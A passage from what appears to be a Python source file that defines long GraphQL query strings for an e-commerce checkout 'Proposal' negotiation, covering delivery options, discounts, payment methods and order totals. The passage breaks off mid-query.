__typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}

"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode 